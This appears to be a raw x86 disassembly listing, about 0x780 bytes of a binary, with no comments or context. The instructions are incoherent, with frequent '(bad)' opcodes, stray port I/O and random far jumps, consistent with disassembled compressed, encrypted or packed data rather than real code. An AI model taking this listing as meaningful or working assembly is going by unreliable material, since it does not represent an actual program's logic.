  41bd87:	fcomp  QWORD PTR ds:0x164745c4
  41bd8d:	dec    ecx
  41bd8e:	sub    DWORD PTR [ebx+ebp*1],esp
  41bd91:	sar    BYTE PTR [esi-0x91c609d],0x54
  41bd98:	pushf  
  41bd99:	dec    esp
  41bd9a:	jle    0x41bddc
  41bd9c:	mov    bl,0xed
  41bd9e:	jno    0x41be11
  41bda0:	and    al,0x93
  41bda2:	sub    al,0x6d
  41bda4:	xor    edx,DWORD PTR [ebx+0x6d0f7561]
  41bdaa:	sub    dl,BYTE PTR [esi+0x1396b94e]
  41bdb0:	mov    BYTE PTR [edx+0x262134fe],ah
  41bdb6:	xchg   DWORD PTR [edi],eax
  41bdb8:	sbb    dl,al
  41bdba:	sbb    al,BYTE PTR [ecx]
  41bdbc:	add    edi,DWORD PTR [eax]
  41bdbe:	adc    ecx,DWORD PTR [ebx+eiz*1-0x1b]
  41bdc2:	sti    
  41bdc3:	outs   dx,DWORD PTR ds:[esi]
  41bdc4:	(bad)  
  41bdc5:	and    eax,0x14e02534
  41bdca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdcb:	fisub  WORD PTR [esi]
  41bdcd:	sar    DWORD PTR [eax],cl
  41bdcf:	sahf   
  41bdd0:	pop    eax
  41bdd1:	cmc    
  41bdd2:	stc    
  41bdd3:	add    esp,DWORD PTR [ebp+edi*8-0x64]
  41bdd7:	jg     0x41bd90
  41bdd9:	jp     0x41bd8e
  41bddb:	dec    eax
  41bddc:	xor    ch,BYTE PTR [ecx+0x33]
  41bddf:	cwde   
  41bde0:	or     ebx,DWORD PTR [ebx]
  41bde2:	pop    edx
  41bde3:	das    
  41bde4:	shl    DWORD PTR [eax-0x56],1
  41bde7:	rcl    DWORD PTR [eax+0x69],cl
  41bdea:	xchg   ebp,eax
  41bdeb:	push   es
  41bdec:	in     al,0x35
  41bdee:	(bad)  
  41bdef:	sub    ah,BYTE PTR [esi]
  41bdf1:	pop    ds
  41bdf2:	jp     0x41bddc
  41bdf4:	sub    eax,0xb6c9803d
  41bdf9:	test   edi,0x95b975e9
  41bdff:	mov    ch,0x1c
  41be01:	or     eax,0xe6d48c95
  41be06:	out    dx,eax
  41be07:	inc    eax
  41be08:	inc    edi
  41be09:	aad    0xbf
  41be0b:	mov    edi,0xea635247
  41be10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be11:	ins    DWORD PTR es:[edi],dx
  41be12:	cmc    
  41be13:	jne    0x41bde0
  41be15:	popf   
  41be16:	sub    al,0xd0
  41be18:	cdq    
  41be19:	mov    ebx,DWORD PTR [edi+0x19]
  41be1c:	cmp    esi,DWORD PTR [edi]
  41be1e:	bound  eax,QWORD PTR [esi+0x72]
  41be21:	cmp    BYTE PTR [eax],dl
  41be23:	(bad)  
  41be24:	es jno 0x41be87
  41be27:	xor    ebp,DWORD PTR [edi+edi*2+0x5998a45d]
  41be2e:	pop    es
  41be2f:	aaa    
  41be30:	popf   
  41be31:	mov    eax,0x3d487cb
  41be36:	push   edx
  41be37:	test   al,0x5
  41be39:	out    dx,al
  41be3a:	xchg   DWORD PTR [edi-0xedca3e8],edx
  41be40:	add    BYTE PTR [ecx],bl
  41be42:	mov    ebp,0x9b8ee2e
  41be47:	add    ecx,esi
  41be49:	jno    0x41be59
  41be4b:	push   esp
  41be4c:	mov    ah,0xa3
  41be4e:	retf   
  41be4f:	in     al,dx
  41be50:	loope  0x41beac
  41be52:	pop    esp
  41be53:	(bad)  
  41be54:	lock mov edi,0x54e160d4
  41be5a:	jnp    0x41bdfa
  41be5c:	mov    ecx,0x94dcc2d4
  41be61:	outs   dx,BYTE PTR ds:[esi]
  41be62:	loope  0x41bea9
  41be64:	loop   0x41be50
  41be66:	ja     0x41be69
  41be68:	inc    edi
  41be69:	(bad)  
  41be6a:	push   ds
  41be6b:	mov    ch,0x33
  41be6d:	dec    ebx
  41be6e:	and    DWORD PTR [edx+ebx*4],ebx
  41be71:	mov    ecx,0x1752caff
  41be76:	jno    0x41bee1
  41be78:	xor    al,0xa8
  41be7a:	push   cs
  41be7b:	test   eax,0x979fa443
  41be80:	aad    0x5c
  41be82:	mov    ebp,0x57fd1198
  41be87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be88:	sub    ecx,ebp
  41be8a:	jb     0x41be8a
  41be8c:	in     eax,0x72
  41be8e:	arpl   di,bp
  41be90:	jmp    0xbf54:0x89773a4c
  41be97:	mov    al,0xde
  41be99:	and    DWORD PTR [edi],esp
  41be9b:	movq   QWORD PTR [ecx+0x1fc42496],mm6
  41bea2:	cmp    ecx,DWORD PTR [esi+0x472fbfe5]
  41bea8:	clts   
  41beaa:	dec    ecx
  41beab:	pop    esi
  41beac:	or     al,dh
  41beae:	sbb    BYTE PTR [edi],dh
  41beb0:	sub    BYTE PTR [esi],bh
  41beb2:	xor    eax,0xbaa9a498
  41beb7:	sahf   
  41beb8:	dec    ebx
  41beb9:	ja     0x41bf35
  41bebb:	mov    esp,0x4c0e1aa9
  41bec0:	imul   ebx,DWORD PTR [eax-0x65],0xfffffff1
  41bec4:	xor    dh,BYTE PTR [ecx+0x74685895]
  41beca:	mov    WORD PTR [ecx+0x1789a948],ds
  41bed0:	ror    BYTE PTR [edi+eax*4-0x67602516],cl
  41bed7:	outs   dx,BYTE PTR ds:[esi]
  41bed8:	push   es
  41bed9:	and    eax,0x1d723873
  41bede:	inc    edx
  41bedf:	xchg   edi,eax
  41bee0:	outs   dx,WORD PTR es:[esi]
  41bee3:	inc    ebp
  41bee4:	inc    eax
  41bee5:	mov    eax,0x34453890
  41beea:	loope  0x41be8b
  41beec:	call   0x4a53439b
  41bef1:	cmp    bl,BYTE PTR [esi+0x66203057]
  41bef7:	or     DWORD PTR [ebp-0x25],0x5be0aac4
  41befe:	inc    edx
  41beff:	arpl   WORD PTR [esi],ax
  41bf01:	(bad)  
  41bf02:	ret    0x22de
  41bf05:	xor    bl,BYTE PTR [ecx+0x68a9ff48]
  41bf0b:	add    dl,al
  41bf0d:	in     eax,0xcc
  41bf0f:	cs enter 0x373b,0xe4
  41bf14:	jae    0x41bed9
  41bf16:	mov    ah,ch
  41bf18:	mov    bl,0x35
  41bf1a:	or     BYTE PTR [ecx],bh
  41bf1c:	sbb    bh,0xdb
  41bf1f:	in     eax,0xb5
  41bf21:	stos   BYTE PTR es:[edi],al
  41bf22:	pop    ebp
  41bf23:	sahf   
  41bf24:	rcr    BYTE PTR [esi+0x33],0x9e
  41bf28:	bound  ebp,QWORD PTR [edi+eiz*4]
  41bf2b:	std    
  41bf2c:	push   ds
  41bf2d:	(bad)  
  41bf2e:	imul   edx,DWORD PTR [edi],0xffffff83
  41bf31:	std    
  41bf32:	ret    0x3fdf
  41bf35:	xchg   esi,eax
  41bf36:	push   0x2e
  41bf38:	inc    esp
  41bf39:	xchg   esp,eax
  41bf3a:	retf   0x5a21
  41bf3d:	fwait
  41bf3e:	jmp    0x693b:0x4f691d1b
  41bf45:	sahf   
  41bf46:	fadd   st,st(7)
  41bf48:	push   0xdf96db86
  41bf4d:	jo     0x41befa
  41bf4f:	scas   al,BYTE PTR es:[edi]
  41bf50:	xchg   ebp,eax
  41bf51:	daa    
  41bf52:	inc    ebx
  41bf53:	or     ecx,DWORD PTR [edi-0x3b]
  41bf56:	and    ah,al
  41bf58:	mov    ebp,0x191786d3
  41bf5d:	mov    eax,0x66499a0c
  41bf62:	mov    esp,0x9b660e75
  41bf67:	stc    
  41bf68:	pop    ds
  41bf69:	mov    edi,0xfb0f0e51
  41bf6e:	pusha  
  41bf6f:	and    al,BYTE PTR [eax+ebp*4]
  41bf72:	les    esp,FWORD PTR [ebx-0xa]
  41bf75:	cli    
  41bf76:	shl    DWORD PTR [edx+eiz*2-0x654e4d75],0x4b
  41bf7e:	mov    ch,0x83
  41bf80:	xor    DWORD PTR [edx-0x5d19e979],eax
  41bf86:	jo     0x41bfe9
  41bf88:	sub    eax,0x245c94da
  41bf8d:	(bad)  ds:0xa551db80
  41bf93:	pop    ecx
  41bf94:	inc    eax
  41bf95:	xor    dh,ah
  41bf97:	jo     0x41bf84
  41bf99:	mov    ds:0x6e483917,al
  41bf9e:	(bad)  
  41bf9f:	push   ebp
  41bfa0:	and    eax,ebx
  41bfa2:	shr    BYTE PTR [edx],1
  41bfa4:	test   eax,0x5c0e7879
  41bfa9:	and    al,BYTE PTR [esi+ebp*2+0x7eb7fb2d]
  41bfb0:	(bad)  
  41bfb1:	cmp    al,0x11
  41bfb3:	sub    al,ch
  41bfb5:	inc    edx
  41bfb6:	push   esp
  41bfb7:	fisubr DWORD PTR [ebp+0x359e24b1]
  41bfbd:	lea    ecx,[edx+0x53]
  41bfc0:	push   ds
  41bfc1:	das    
  41bfc2:	(bad)
  41bfc5:	and    esi,eax
  41bfc7:	cld    
  41bfc8:	push   ss
  41bfc9:	sbb    eax,0x6b8513b1
  41bfce:	sahf   
  41bfcf:	mov    di,sp
  41bfd2:	rol    DWORD PTR [ecx*4+0x1c143bdc],cl
  41bfd9:	imul   ebp,ebx,0x2e
  41bfdc:	fcom   st(3)
  41bfde:	and    BYTE PTR [eax+0x73],al
  41bfe1:	pushf  
  41bfe2:	mov    ?,WORD PTR ds:0x2945af33
  41bfe8:	dec    eax
  41bfe9:	jb     0x41bfa9
  41bfeb:	les    eax,FWORD PTR [esi-0xce495de]
  41bff1:	adc    DWORD PTR [ebx],ebp
  41bff3:	rcl    BYTE PTR [esi],cl
  41bff5:	pop    edx
  41bff6:	xchg   edx,eax
  41bff7:	push   0xbac4c970
  41bffc:	jl     0x41bf86
  41bffe:	jo     0x41c05d
  41c000:	dec    ax
  41c002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c003:	mov    cl,0xb2
  41c005:	std    
  41c006:	sar    DWORD PTR [ecx+edi*1-0x40b3d836],0x92
  41c00e:	sahf   
  41c00f:	sub    edx,DWORD PTR [ecx]
  41c011:	jae    0x41c066
  41c013:	ror    edx,1
  41c015:	cmp    dh,BYTE PTR [edx-0x150c6596]
  41c01b:	jmp    0x9c812988
  41c020:	popa   
  41c021:	sbb    ah,BYTE PTR [eax]
  41c023:	push   ecx
  41c024:	ins    DWORD PTR es:[edi],dx
  41c025:	loopne 0x41c02d
  41c027:	scas   al,BYTE PTR es:[edi]
  41c028:	aad    0x97
  41c02a:	push   eax
  41c02b:	xor    al,0x7b
  41c02d:	fild   DWORD PTR [edx+ebp*1-0x32f8117f]
  41c034:	cmp    bl,BYTE PTR [ecx+edx*1-0x4f]
  41c038:	mov    ecx,0xe3a96f41
  41c03d:	mov    esp,ecx
  41c03f:	(bad)  
  41c040:	sar    BYTE PTR [ebx-0x3b],1
  41c043:	inc    ebp
  41c044:	shl    BYTE PTR [eax-0x1cf2d922],1
  41c04a:	mov    edx,eax
  41c04c:	ins    DWORD PTR es:[edi],dx
  41c04d:	sbb    al,0x84
  41c04f:	lock mov al,0xcd
  41c052:	mov    edi,0x36be2e94
  41c057:	mov    esi,0xe4d64280
  41c05c:	pop    edx
  41c05d:	icebp  
  41c05e:	sub    ecx,ebp
  41c060:	dec    ebp
  41c061:	push   edi
  41c062:	fadd   QWORD PTR [eax-0x5e]
  41c065:	or     DWORD PTR [edx+0x45bf2624],0x73
  41c06c:	inc    edx
  41c06d:	aad    0xa8
  41c06f:	cmp    edi,ebx
  41c071:	cmp    al,0x11
  41c073:	int    0x33
  41c075:	mov    al,0x5c
  41c077:	ins    BYTE PTR es:[edi],dx
  41c078:	(bad)  
  41c079:	leave  
  41c07a:	push   edx
  41c07b:	and    ch,BYTE PTR [eax+0x5e]
  41c07e:	add    BYTE PTR [eax],al
  41c080:	add    BYTE PTR [eax],al
  41c082:	mov    dh,0x3a
  41c084:	out    0x1,eax
  41c086:	out    dx,eax
  41c087:	(bad)  
  41c089:	mov    edi,0xdf2dff43
  41c08e:	push   ebx
  41c08f:	cmp    cl,BYTE PTR [esi+ebp*2+0x7d]
  41c093:	cmp    al,0x1
  41c095:	add    ah,dh
  41c097:	add    al,0x0
  41c099:	add    al,bh
  41c09b:	aam    0x70
  41c09d:	fwait
  41c09e:	aaa    
  41c09f:	stos   DWORD PTR es:[edi],eax
  41c0a0:	jno    0x41c09b
  41c0a2:	notrack call DWORD PTR [eax-0x5c]
  41c0a6:	add    DWORD PTR [edx],edx
  41c0a8:	adc    al,0xae
  41c0aa:	and    eax,0xabd59958
  41c0af:	rcl    BYTE PTR [edi],0xa6
  41c0b2:	outs   dx,DWORD PTR ds:[esi]
  41c0b3:	popa   
  41c0b4:	inc    ecx
  41c0b5:	dec    esp
  41c0b6:	xchg   edx,eax
  41c0b7:	sub    BYTE PTR [edi],dh
  41c0b9:	inc    esp
  41c0ba:	or     bl,BYTE PTR [edx-0x4e]
  41c0bd:	inc    edi
  41c0be:	jnp    0x41c079
  41c0c0:	xchg   BYTE PTR [eax+0x477037de],dl
  41c0c6:	or     al,0x8b
  41c0c8:	mov    esp,0x61acf412
  41c0cd:	add    bl,cl
  41c0cf:	add    edx,DWORD PTR [edi+0x55]
  41c0d2:	sub    al,dh
  41c0d4:	sub    al,0xda
  41c0d6:	or     ecx,edi
  41c0d8:	adc    al,0xda
  41c0da:	jns    0x41c06c
  41c0dc:	out    0x34,al
  41c0de:	sub    edi,edx
  41c0e0:	scas   eax,DWORD PTR es:[edi]
  41c0e1:	out    0xb8,eax
  41c0e3:	sti    
  41c0e4:	in     eax,dx
  41c0e5:	sub    dl,BYTE PTR [edi+0x56281417]
  41c0eb:	jmp    0x7aca:0x7445c1b0
  41c0f2:	call   0x1249a3bd
  41c0f7:	inc    edi
  41c0f8:	push   ds
  41c0f9:	xchg   edx,eax
  41c0fa:	jecxz  0x41c099
  41c0fc:	jmp    0x41c12e
  41c0fe:	jb     0x41c17d
  41c100:	sub    eax,0xa29439a8
  41c105:	shl    DWORD PTR [esi],1
  41c107:	cmp    eax,0xecaff025
  41c10c:	jne    0x41c091
  41c10e:	mov    ds,esi
  41c110:	adc    ebx,edx
  41c112:	sbb    al,bl
  41c114:	jecxz  0x41c0b7
  41c116:	retf   
  41c117:	loope  0x41c0ca
  41c119:	push   ds
  41c11a:	sbb    al,0x93
  41c11c:	call   0x4383:0x944c9998
  41c123:	rcr    DWORD PTR ds:0x3793827,0xda
  41c12a:	cmp    DWORD PTR [eax-0x7746cde1],edi
  41c130:	(bad)  
  41c131:	fldcw  WORD PTR [ecx+0x3e7b474b]
  41c137:	or     eax,0x1365616d
  41c13c:	jmp    0x41c158
  41c13e:	sahf   
  41c13f:	pop    ds
  41c140:	mov    dl,0xb
  41c142:	xor    al,0x1c
  41c144:	pop    esp
  41c145:	lods   eax,DWORD PTR ds:[esi]
  41c146:	xor    al,0x13
  41c148:	add    DWORD PTR [edx+ebp*1],ebp
  41c14b:	cmp    eax,0xcdb647bc
  41c150:	pop    ss
  41c151:	sbb    dl,bl
  41c153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c154:	fnstenv [edx-0x78d0eedd]
  41c15a:	cmp    DWORD PTR [edx],0x1f
  41c15d:	sub    BYTE PTR [eax-0x3527f2c9],al
  41c163:	pop    edx
  41c164:	fisub  DWORD PTR [esi+ebx*4-0x15]
  41c168:	iret   
  41c169:	mov    al,ds:0x6596b378
  41c16e:	jmp    0xf14d6fa8
  41c173:	or     edx,DWORD PTR [ecx]
  41c175:	xor    BYTE PTR [ecx+0x58],0x5
  41c179:	xor    al,0x52
  41c17b:	jnp    0x41c1e9
  41c17d:	aam    0x3d
  41c17f:	test   al,dh
  41c181:	adc    edx,edi
  41c183:	call   FWORD PTR [ebp+0x1726a86f]
  41c189:	mov    esi,0xe92e0387
  41c18e:	cmp    ebx,DWORD PTR [ebx]
  41c190:	sbb    eax,0x4f67ef17
  41c195:	mov    ch,0x7e
  41c197:	push   eax
  41c198:	(bad)  
  41c199:	or     eax,DWORD PTR [edx]
  41c19b:	inc    ebp
  41c19c:	sahf   
  41c19d:	add    DWORD PTR [esp+edx*1],edi
  41c1a0:	cdq    
  41c1a1:	call   0xd107093d
  41c1a6:	push   eax
  41c1a7:	push   cs
  41c1a8:	int    0x95
  41c1aa:	dec    edx
  41c1ab:	gs aaa 
  41c1ad:	mov    al,0xc7
  41c1af:	xchg   esp,eax
  41c1b0:	daa    
  41c1b1:	call   0x68e5:0xdb888310
  41c1b8:	jne    0x41c1b9
  41c1ba:	xchg   ecx,eax
  41c1bb:	aad    0x3b
  41c1bd:	popf   
  41c1be:	loop   0x41c184
  41c1c0:	add    esi,DWORD PTR [edx-0x3e]
  41c1c3:	mov    edx,0x2f555e9c
  41c1c8:	add    ecx,DWORD PTR [edx-0x7d]
  41c1cb:	jp     0x41c176
  41c1cd:	pop    ebx
  41c1ce:	cmp    DWORD PTR [ebp-0x9],0x2c
  41c1d2:	lock aam 0x7d
  41c1d5:	fwait
  41c1d6:	or     eax,0xe7e3f399
  41c1db:	cmp    ecx,DWORD PTR [esi+0x7fb1c24]
  41c1e1:	or     eax,0x559e23bb
  41c1e6:	jmp    0x5ce6:0x5c3befc6
  41c1ed:	push   es
  41c1ee:	ins    BYTE PTR es:[edi],dx
  41c1ef:	add    bl,bh
  41c1f1:	sti    
  41c1f2:	imul   edi,DWORD PTR [eax-0x5fef43ce],0xb72ad746
  41c1fc:	mov    ebp,0xdb0f526e
  41c201:	sub    ebp,ecx
  41c203:	add    BYTE PTR [esi+edx*2],0xfb
  41c207:	mov    esi,ss
  41c209:	sub    al,dh
  41c20b:	aas    
  41c20c:	lds    edi,FWORD PTR [ecx]
  41c20e:	retf   
  41c20f:	loopne 0x41c22c
  41c211:	xchg   dh,cl
  41c213:	inc    eax
  41c214:	jnp    0x41c25f
  41c216:	pop    ss
  41c217:	cmp    eax,DWORD PTR [esi-0x3c]
  41c21a:	adc    BYTE PTR [ebx-0x12],0x67
  41c21e:	xchg   ebx,eax
  41c21f:	imul   ecx,DWORD PTR [ebp-0x4e763c8a],0x2d
  41c226:	aas    
  41c227:	jp     0x41c21e
  41c229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c22a:	imul   eax,DWORD PTR [edx+0x521bd88f],0x1e
  41c231:	mov    ecx,0x508aa8f2
  41c236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c237:	sub    DWORD PTR [esi],ebp
  41c239:	cdq    
  41c23a:	leave  
  41c23b:	stos   BYTE PTR es:[edi],al
  41c23c:	mov    al,0x6c
  41c23e:	iret   
  41c23f:	jmp    DWORD PTR [edx+0x1c]
  41c242:	jne    0x41c273
  41c244:	int3   
  41c245:	lods   eax,DWORD PTR ds:[esi]
  41c246:	xchg   BYTE PTR [edi+0x111b114f],ch
  41c24c:	inc    esp
  41c24d:	xor    eax,0x827210a
  41c252:	lds    esp,FWORD PTR [esi+0x4]
  41c255:	push   ebp
  41c256:	sahf   
  41c257:	add    dl,BYTE PTR [edx]
  41c259:	jb     0x41c292
  41c25b:	jg     0x41c2d0
  41c25d:	das    
  41c25e:	cmc    
  41c25f:	inc    esp
  41c260:	push   es
  41c261:	ss cwde 
  41c263:	push   esp
  41c264:	rcr    BYTE PTR [ebp+0x8],1
  41c267:	xchg   edi,ebp
  41c269:	mov    gs,WORD PTR [edi+0x3897476b]
  41c26f:	add    cl,BYTE PTR [ebp+0x57bd9ff6]
  41c275:	mov    ch,0x93
  41c277:	xchg   ebx,eax
  41c278:	cmp    BYTE PTR [ebx+0xa],0xf8
  41c27c:	daa    
  41c27d:	pop    esp
  41c27e:	mov    esp,0xda06c002
  41c283:	dec    eax
  41c284:	lods   al,BYTE PTR ds:[esi]
  41c285:	xor    DWORD PTR [ecx+0x138bd981],0x34
  41c28c:	std    
  41c28d:	fsubr  QWORD PTR es:[ebx]
  41c290:	fiadd  DWORD PTR ds:0x118b5bb
  41c296:	push   ebx
  41c297:	push   ds
  41c298:	mov    cl,0xad
  41c29a:	ficomp WORD PTR [ecx+0x1a990dd9]
  41c2a0:	fsub   DWORD PTR [esi-0x33e8b547]
  41c2a6:	push   ss
  41c2a7:	ficom  WORD PTR [esi+0x1c]
  41c2aa:	sbb    al,0xa0
  41c2ac:	mov    eax,ds:0x8ba87dbe
  41c2b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2b2:	popf   
  41c2b3:	lods   al,BYTE PTR ds:[esi]
  41c2b4:	and    cl,BYTE PTR ds:0x8de4246d
  41c2ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2bb:	loop   0x41c27c
  41c2bd:	dec    ecx
  41c2be:	mov    WORD PTR [ebp+0x521b0f30],ss
  41c2c4:	mov    ds:0x9617bb21,al
  41c2c9:	push   ss
  41c2ca:	enter  0xad74,0xbc
  41c2ce:	xchg   esi,eax
  41c2cf:	jae    0x41c326
  41c2d1:	inc    ecx
  41c2d2:	scas   eax,DWORD PTR es:[edi]
  41c2d3:	and    al,BYTE PTR [ebx]
  41c2d5:	xor    ebx,esi
  41c2d7:	call   0x3a05:0x8c587627
  41c2de:	sbb    al,0xbd
  41c2e0:	test   al,0x2f
  41c2e2:	(bad)  
  41c2e5:	daa    
  41c2e6:	fild   WORD PTR [ecx+0x4d]
  41c2e9:	fstp   TBYTE PTR [ebx-0x12]
  41c2ec:	jle    0x41c2e8
  41c2ee:	aam    0xfc
  41c2f0:	pop    fs
  41c2f2:	aas    
  41c2f3:	lods   eax,DWORD PTR ds:[esi]
  41c2f4:	dec    ebx
  41c2f5:	and    edx,DWORD PTR [ebp+0x3071b7ab]
  41c2fb:	cmp    BYTE PTR [ebp+0x2fcbdd5c],0xa
  41c302:	xor    dl,bl
  41c304:	retf   0x5f13
  41c307:	jecxz  0x41c306
  41c309:	sar    BYTE PTR ss:[esi-0x1e],1
  41c30d:	loopne 0x41c349
  41c30f:	icebp  
  41c310:	sub    eax,0xfc7bc5f4
  41c315:	mov    bh,0xa6
  41c317:	push   edi
  41c318:	push   ecx
  41c319:	and    eax,0xee861866
  41c31e:	mov    BYTE PTR [eax],bl
  41c320:	mul    edi
  41c322:	sbb    al,0x97
  41c324:	pop    ss
  41c325:	dec    ebp
  41c326:	adc    ah,BYTE PTR [eax+esi*8-0x5aca12cd]
  41c32d:	push   ebx
  41c32e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c32f:	int3   
  41c330:	dec    ebx
  41c331:	jg     0x41c2f6
  41c333:	push   edx
  41c334:	push   eax
  41c335:	loope  0x41c388
  41c337:	fadd   DWORD PTR [ebx-0x28898d81]
  41c33d:	xchg   BYTE PTR [edx+0xd],ah
  41c340:	lods   al,BYTE PTR ds:[esi]
  41c341:	dec    ebp
  41c342:	(bad)  [eax+0x526af97a]
  41c348:	loope  0x41c3a0
  41c34a:	stos   DWORD PTR es:[edi],eax
  41c34b:	arpl   WORD PTR [ebx],ax
  41c34d:	enter  0xc05e,0x89
  41c351:	lock ret 
  41c353:	cmp    al,0xc3
  41c355:	loope  0x41c364
  41c357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c358:	adc    esi,DWORD PTR [ebx]
  41c35a:	jne    0x41c2f3
  41c35c:	cmp    cl,dl
  41c35e:	mov    dh,0x56
  41c360:	xor    eax,0x66aa539f
  41c365:	mov    ebp,0xed13075e
  41c36a:	out    0xe4,eax
  41c36c:	inc    ebx
  41c36d:	loope  0x41c3de
  41c36f:	pop    esp
  41c370:	clc    
  41c371:	and    ebx,DWORD PTR [ecx+0x11]
  41c374:	xor    ebp,edi
  41c376:	nop
  41c377:	scas   eax,DWORD PTR es:[edi]
  41c378:	out    dx,eax
  41c379:	out    0xb4,al
  41c37b:	or     bh,BYTE PTR fs:[edx+eiz*1-0x5a]
  41c380:	cdq    
  41c381:	dec    ebx
  41c382:	loopne 0x41c3d2
  41c384:	and    BYTE PTR [ebx+0x2bc22076],dh
  41c38a:	loope  0x41c3ee
  41c38c:	in     eax,0x15
  41c38e:	mul    esp
  41c390:	inc    ax
  41c392:	push   0xfa2fc6c4
  41c397:	lods   eax,DWORD PTR ds:[esi]
  41c398:	mov    eax,0x469471c
  41c39d:	sahf   
  41c39e:	adc    al,0xe6
  41c3a0:	xor    dl,BYTE PTR [eax+0x34]
  41c3a3:	or     ebx,ecx
  41c3a5:	int    0xe5
  41c3a7:	shl    ebx,0x18
  41c3aa:	push   es
  41c3ab:	inc    ebp
  41c3ac:	jne    0x41c394
  41c3ae:	or     edi,esi
  41c3b0:	mov    eax,ds:0x865a995e
  41c3b5:	jb     0x41c419
  41c3b7:	cld    
  41c3b8:	int3   
  41c3b9:	jb     0x41c3d8
  41c3bb:	sbb    DWORD PTR [esi+0x1d],ebx
  41c3be:	mov    edx,0xc082235b
  41c3c3:	sbb    DWORD PTR [ecx+0x37],0x65bcdf5c
  41c3ca:	inc    edx
  41c3cb:	mov    ch,0xdd
  41c3cd:	jbe    0x41c3e8
  41c3cf:	dec    ecx
  41c3d0:	pop    edi
  41c3d1:	xchg   edi,eax
  41c3d2:	test   DWORD PTR [ecx],edi
  41c3d4:	push   edi
  41c3d5:	xor    eax,0x37e37bb2
  41c3da:	fwait
  41c3db:	and    eax,0x43a6067c
  41c3e0:	les    ebx,FWORD PTR [edx+0x6108ca9a]
  41c3e6:	inc    eax
  41c3e7:	push   eax
  41c3e8:	xor    al,0xc9
  41c3ea:	scas   eax,DWORD PTR es:[edi]
  41c3eb:	jne    0x41c3a6
  41c3ed:	push   0x557aac9b
  41c3f2:	mov    ebp,0x85d1e504
  41c3f7:	xor    eax,0x39dbd0db
  41c3fc:	in     eax,0xb4
  41c3fe:	sub    dl,dh
  41c400:	xchg   ecx,eax
  41c401:	push   cs
  41c402:	leave  
  41c403:	jg     0x41c421
  41c405:	lock js 0x41c39a
  41c408:	mov    ebx,0xea5103b1
  41c40d:	xor    eax,edi
  41c40f:	inc    esp
  41c410:	mov    ds:0x1b90f0cb,al
  41c415:	hlt    
  41c416:	addr16 xchg esi,eax
  41c418:	idiv   dl
  41c41a:	ja     0x41c45e
  41c41c:	rcl    dl,cl
  41c41e:	mov    esi,ecx
  41c420:	xor    al,0xdb
  41c422:	jns    0x41c484
  41c424:	mov    esi,0xe9be9cb3
  41c429:	sti    
  41c42a:	xchg   BYTE PTR [ecx],al
  41c42c:	mov    dh,0x84
  41c42e:	sar    DWORD PTR [edx],cl
  41c430:	punpckhbw mm1,mm6
  41c433:	pop    es
  41c434:	inc    ecx
  41c435:	or     DWORD PTR [ecx+eax*8-0x25],eax
  41c439:	jb     0x41c48b
  41c43b:	xor    ebp,eax
  41c43d:	jge    0x41c4a2
  41c43f:	xor    al,0x55
  41c441:	mov    ah,0xbd
  41c443:	push   ds
  41c444:	mov    ecx,DWORD PTR [ebx-0x5b]
  41c447:	sti    
  41c448:	mov    ds:0x8444cbfe,eax
  41c44d:	popf   
  41c44e:	stos   BYTE PTR es:[edi],al
  41c44f:	pop    esi
  41c450:	push   ds
  41c451:	sub    al,0xa6
  41c453:	lock into 
  41c455:	sub    DWORD PTR [ebx],eax
  41c457:	mov    ecx,0x212b22a8
  41c45c:	cmp    BYTE PTR [ebx],al
  41c45e:	mov    edx,0xaf85d5ff
  41c463:	lea    ecx,[esi+0x3b]
  41c466:	imul   ebx,eax,0x465dfadb
  41c46c:	aad    0xa4
  41c46e:	jns    0x41c4a3
  41c470:	and    ebx,DWORD PTR [edx]
  41c472:	(bad)  
  41c473:	out    0x92,eax
  41c475:	sahf   
  41c476:	test   BYTE PTR [esi+eax*4+0x50f5a9aa],ch
  41c47d:	call   0xbf80:0x11d410fe
  41c484:	jle    0x41c41d
  41c486:	push   ebp
  41c487:	scas   eax,DWORD PTR es:[edi]
  41c488:	leave  
  41c489:	sbb    cl,BYTE PTR [ecx]
  41c48b:	icebp  
  41c48c:	adc    DWORD PTR [eax+esi*8],0xffffffdc
  41c490:	aam    0x75
  41c492:	xlat   BYTE PTR ds:[ebx]
  41c493:	xchg   ebx,eax
  41c494:	lds    edi,FWORD PTR [edx]
  41c496:	xor    DWORD PTR [eax+0x29],esi
  41c499:	stos   BYTE PTR es:[edi],al
  41c49a:	dec    ebp
  41c49b:	stc    
  41c49c:	jno    0x41c45e
  41c49e:	in     eax,0x52
  41c4a0:	or     DWORD PTR [ecx],ebp
  41c4a2:	jbe    0x41c4e0
  41c4a4:	jne    0x41c4df
  41c4a6:	sbb    dh,ch
  41c4a8:	mov    eax,0x760d7f3c
  41c4ad:	mov    edi,0xfeeb2b5
  41c4b2:	iret   
  41c4b3:	and    eax,0x4f0509e6
  41c4b8:	not    ch
  41c4ba:	push   ebp
  41c4bb:	lds    edi,FWORD PTR [ebx+0xe]
  41c4be:	in     eax,dx
  41c4bf:	mov    al,ds:0x18f26e81
  41c4c4:	pop    ds
  41c4c5:	mov    dh,0xda
  41c4c7:	(bad)  
  41c4c8:	or     dl,BYTE PTR [edx]
  41c4ca:	dec    esp
  41c4cb:	dec    ecx
  41c4cc:	lods   al,BYTE PTR ds:[esi]
  41c4cd:	adc    esp,DWORD PTR [ebx+0x37f4c30]
  41c4d3:	push   0xe6adbe3d
  41c4d8:	cmp    eax,0x1f1b76c8
  41c4dd:	push   0x2f
  41c4df:	xchg   ebp,eax
  41c4e0:	rol    BYTE PTR [edi+0x4f90c6ed],1
  41c4e6:	mov    edi,0x65c5cc2f
  41c4eb:	push   ebp
  41c4ec:	mov    ebx,0x3fa47a50
  41c4f1:	(bad)  
  41c4f2:	fild   QWORD PTR [ebp+0x55d0ae76]
  41c4f8:	mov    BYTE PTR [esi+0x4d],ch
  41c4fb:	or     al,BYTE PTR [edx]
  41c4fd:	int3   
  41c4fe:	cmc    
  41c4ff:	cmc    
  41c500:	mov    ecx,esp
